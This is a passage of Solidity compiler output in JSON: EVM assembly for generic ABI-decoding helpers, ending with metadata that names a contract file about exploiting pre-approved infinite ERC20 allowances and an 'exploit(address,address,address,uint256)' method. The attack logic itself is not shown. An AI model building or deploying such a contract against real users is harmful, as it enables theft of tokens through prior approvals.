											"begin": 568,
											"end": 690,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 568,
											"end": 690,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "tag",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 696,
											"end": 835,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 742,
											"end": 747,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 780,
											"end": 786,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 767,
											"end": 787,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 758,
											"end": 787,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 758,
											"end": 787,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 823,
											"end": 828,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 796,
											"end": 829,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 796,
											"end": 829,
											"name": "tag",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 696,
											"end": 835,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 918,
											"name": "tag",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 841,
											"end": 918,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 878,
											"end": 885,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 907,
											"end": 912,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 896,
											"end": 912,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 896,
											"end": 912,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 918,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 841,
											"end": 918,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 841,
											"end": 918,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 841,
											"end": 918,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 924,
											"end": 1046,
											"name": "tag",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 924,
											"end": 1046,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 997,
											"end": 1021,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 1015,
											"end": 1020,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 997,
											"end": 1021,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 997,
											"end": 1021,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 997,
											"end": 1021,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 997,
											"end": 1021,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 990,
											"end": 995,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 987,
											"end": 1022,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 977,
											"end": 1040,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 977,
											"end": 1040,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1036,
											"end": 1037,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1033,
											"end": 1034,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1026,
											"end": 1038,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 977,
											"end": 1040,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 977,
											"end": 1040,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 924,
											"end": 1046,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 924,
											"end": 1046,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1052,
											"end": 1191,
											"name": "tag",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1052,
											"end": 1191,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1098,
											"end": 1103,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1136,
											"end": 1142,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1123,
											"end": 1143,
											"name": "CALLDATALOAD",
											"source": 2
										},
										{
											"begin": 1114,
											"end": 1143,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1114,
											"end": 1143,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1152,
											"end": 1185,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1179,
											"end": 1184,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1152,
											"end": 1185,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "23"
										},
										{
											"begin": 1152,
											"end": 1185,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1152,
											"end": 1185,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1152,
											"end": 1185,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1052,
											"end": 1191,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1052,
											"end": 1191,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1052,
											"end": 1191,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1052,
											"end": 1191,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1052,
											"end": 1191,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "tag",
											"source": 2,
											"value": "6"
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1283,
											"end": 1289,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1291,
											"end": 1297,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1299,
											"end": 1305,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1307,
											"end": 1313,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1356,
											"end": 1359,
											"name": "PUSH",
											"source": 2,
											"value": "80"
										},
										{
											"begin": 1344,
											"end": 1353,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 1335,
											"end": 1342,
											"name": "DUP8",
											"source": 2
										},
										{
											"begin": 1331,
											"end": 1354,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 1327,
											"end": 1360,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 1324,
											"end": 1444,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1324,
											"end": 1444,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1324,
											"end": 1444,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1363,
											"end": 1442,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 1363,
											"end": 1442,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 1363,
											"end": 1442,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1363,
											"end": 1442,
											"name": "tag",
											"source": 2,
											"value": "50"
										},
										{
											"begin": 1363,
											"end": 1442,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1324,
											"end": 1444,
											"name": "tag",
											"source": 2,
											"value": "49"
										},
										{
											"begin": 1324,
											"end": 1444,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1483,
											"end": 1484,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1508,
											"end": 1561,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1553,
											"end": 1560,
											"name": "DUP8",
											"source": 2
										},
										{
											"begin": 1544,
											"end": 1550,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1533,
											"end": 1542,
											"name": "DUP9",
											"source": 2
										},
										{
											"begin": 1529,
											"end": 1551,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1508,
											"end": 1561,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 1508,
											"end": 1561,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1508,
											"end": 1561,
											"name": "tag",
											"source": 2,
											"value": "51"
										},
										{
											"begin": 1508,
											"end": 1561,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1498,
											"end": 1561,
											"name": "SWAP5",
											"source": 2
										},
										{
											"begin": 1498,
											"end": 1561,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1454,
											"end": 1571,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1610,
											"end": 1612,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 1636,
											"end": 1689,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1681,
											"end": 1688,
											"name": "DUP8",
											"source": 2
										},
										{
											"begin": 1672,
											"end": 1678,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1661,
											"end": 1670,
											"name": "DUP9",
											"source": 2
										},
										{
											"begin": 1657,
											"end": 1679,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1636,
											"end": 1689,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 1636,
											"end": 1689,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1636,
											"end": 1689,
											"name": "tag",
											"source": 2,
											"value": "52"
										},
										{
											"begin": 1636,
											"end": 1689,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1626,
											"end": 1689,
											"name": "SWAP4",
											"source": 2
										},
										{
											"begin": 1626,
											"end": 1689,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1581,
											"end": 1699,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1738,
											"end": 1740,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 1764,
											"end": 1817,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1809,
											"end": 1816,
											"name": "DUP8",
											"source": 2
										},
										{
											"begin": 1800,
											"end": 1806,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1789,
											"end": 1798,
											"name": "DUP9",
											"source": 2
										},
										{
											"begin": 1785,
											"end": 1807,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1764,
											"end": 1817,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "21"
										},
										{
											"begin": 1764,
											"end": 1817,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1764,
											"end": 1817,
											"name": "tag",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1764,
											"end": 1817,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1754,
											"end": 1817,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1754,
											"end": 1817,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1709,
											"end": 1827,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1866,
											"end": 1868,
											"name": "PUSH",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 1892,
											"end": 1945,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1937,
											"end": 1944,
											"name": "DUP8",
											"source": 2
										},
										{
											"begin": 1928,
											"end": 1934,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1917,
											"end": 1926,
											"name": "DUP9",
											"source": 2
										},
										{
											"begin": 1913,
											"end": 1935,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 1892,
											"end": 1945,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1892,
											"end": 1945,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1892,
											"end": 1945,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1892,
											"end": 1945,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1882,
											"end": 1945,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1882,
											"end": 1945,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1837,
											"end": 1955,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "SWAP6",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "SWAP5",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1197,
											"end": 1962,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 1968,
											"end": 2086,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 1968,
											"end": 2086,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2055,
											"end": 2079,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 2073,
											"end": 2078,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2055,
											"end": 2079,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "19"
										},
										{
											"begin": 2055,
											"end": 2079,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2055,
											"end": 2079,
											"name": "tag",
											"source": 2,
											"value": "56"
										},
										{
											"begin": 2055,
											"end": 2079,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2050,
											"end": 2053,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2043,
											"end": 2080,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1968,
											"end": 2086,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1968,
											"end": 2086,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1968,
											"end": 2086,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2092,
											"end": 2210,
											"name": "tag",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 2092,
											"end": 2210,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2179,
											"end": 2203,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 2197,
											"end": 2202,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2179,
											"end": 2203,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 2179,
											"end": 2203,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2179,
											"end": 2203,
											"name": "tag",
											"source": 2,
											"value": "58"
										},
										{
											"begin": 2179,
											"end": 2203,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2174,
											"end": 2177,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2167,
											"end": 2204,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 2092,
											"end": 2210,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2092,
											"end": 2210,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2092,
											"end": 2210,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2658,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 2216,
											"end": 2658,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2365,
											"end": 2369,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2403,
											"end": 2405,
											"name": "PUSH",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 2392,
											"end": 2401,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 2388,
											"end": 2406,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2380,
											"end": 2406,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2380,
											"end": 2406,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2416,
											"end": 2487,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 2484,
											"end": 2485,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2473,
											"end": 2482,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2469,
											"end": 2486,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2460,
											"end": 2466,
											"name": "DUP7",
											"source": 2
										},
										{
											"begin": 2416,
											"end": 2487,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 2416,
											"end": 2487,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2416,
											"end": 2487,
											"name": "tag",
											"source": 2,
											"value": "60"
										},
										{
											"begin": 2416,
											"end": 2487,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2497,
											"end": 2569,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 2565,
											"end": 2567,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 2554,
											"end": 2563,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2550,
											"end": 2568,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2541,
											"end": 2547,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 2497,
											"end": 2569,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 2497,
											"end": 2569,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2497,
											"end": 2569,
											"name": "tag",
											"source": 2,
											"value": "61"
										},
										{
											"begin": 2497,
											"end": 2569,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2579,
											"end": 2651,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2647,
											"end": 2649,
											"name": "PUSH",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 2636,
											"end": 2645,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 2632,
											"end": 2650,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 2623,
											"end": 2629,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 2579,
											"end": 2651,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "26"
										},
										{
											"begin": 2579,
											"end": 2651,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2579,
											"end": 2651,
											"name": "tag",
											"source": 2,
											"value": "62"
										},
										{
											"begin": 2579,
											"end": 2651,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2658,
											"name": "SWAP5",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2658,
											"name": "SWAP4",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2658,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2658,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2658,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2658,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2216,
											"end": 2658,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2664,
											"end": 2754,
											"name": "tag",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 2664,
											"end": 2754,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2698,
											"end": 2705,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2741,
											"end": 2746,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2734,
											"end": 2747,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2727,
											"end": 2748,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 2716,
											"end": 2748,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2716,
											"end": 2748,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2664,
											"end": 2754,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2664,
											"end": 2754,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2664,
											"end": 2754,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2664,
											"end": 2754,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2760,
											"end": 2876,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 2760,
											"end": 2876,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2830,
											"end": 2851,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2845,
											"end": 2850,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2830,
											"end": 2851,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "27"
										},
										{
											"begin": 2830,
											"end": 2851,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2830,
											"end": 2851,
											"name": "tag",
											"source": 2,
											"value": "65"
										},
										{
											"begin": 2830,
											"end": 2851,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2823,
											"end": 2828,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2820,
											"end": 2852,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 2810,
											"end": 2870,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2810,
											"end": 2870,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 2866,
											"end": 2867,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2863,
											"end": 2864,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2856,
											"end": 2868,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 2810,
											"end": 2870,
											"name": "tag",
											"source": 2,
											"value": "66"
										},
										{
											"begin": 2810,
											"end": 2870,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2760,
											"end": 2876,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2760,
											"end": 2876,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2882,
											"end": 3019,
											"name": "tag",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 2882,
											"end": 3019,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2936,
											"end": 2941,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 2967,
											"end": 2973,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2961,
											"end": 2974,
											"name": "MLOAD",
											"source": 2
										},
										{
											"begin": 2952,
											"end": 2974,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 2952,
											"end": 2974,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2983,
											"end": 3013,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 3007,
											"end": 3012,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 2983,
											"end": 3013,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 2983,
											"end": 3013,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 2983,
											"end": 3013,
											"name": "tag",
											"source": 2,
											"value": "68"
										},
										{
											"begin": 2983,
											"end": 3013,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 2882,
											"end": 3019,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 2882,
											"end": 3019,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 2882,
											"end": 3019,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2882,
											"end": 3019,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 2882,
											"end": 3019,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3025,
											"end": 3370,
											"name": "tag",
											"source": 2,
											"value": "14"
										},
										{
											"begin": 3025,
											"end": 3370,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3092,
											"end": 3098,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3141,
											"end": 3143,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 3129,
											"end": 3138,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3120,
											"end": 3127,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3116,
											"end": 3139,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 3112,
											"end": 3144,
											"name": "SLT",
											"source": 2
										},
										{
											"begin": 3109,
											"end": 3228,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 3109,
											"end": 3228,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 3109,
											"end": 3228,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 3147,
											"end": 3226,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 3147,
											"end": 3226,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "16"
										},
										{
											"begin": 3147,
											"end": 3226,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3147,
											"end": 3226,
											"name": "tag",
											"source": 2,
											"value": "71"
										},
										{
											"begin": 3147,
											"end": 3226,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3109,
											"end": 3228,
											"name": "tag",
											"source": 2,
											"value": "70"
										},
										{
											"begin": 3109,
											"end": 3228,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3267,
											"end": 3268,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 3292,
											"end": 3353,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 3345,
											"end": 3352,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 3336,
											"end": 3342,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 3325,
											"end": 3334,
											"name": "DUP6",
											"source": 2
										},
										{
											"begin": 3321,
											"end": 3343,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 3292,
											"end": 3353,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 3292,
											"end": 3353,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 2
										},
										{
											"begin": 3292,
											"end": 3353,
											"name": "tag",
											"source": 2,
											"value": "72"
										},
										{
											"begin": 3292,
											"end": 3353,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 3282,
											"end": 3353,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3282,
											"end": 3353,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3238,
											"end": 3363,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3025,
											"end": 3370,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 3025,
											"end": 3370,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 3025,
											"end": 3370,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3025,
											"end": 3370,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 3025,
											"end": 3370,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 2
										}
									]
								}
							},
							"sourceList": [
								"@openzeppelin/contracts/token/ERC20/IERC20.sol",
								"I/Exploitable Transfer Using Pre-approved Infinite Allowance.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"exploit(address,address,address,uint256)": "bdc813c4"
						}
					},
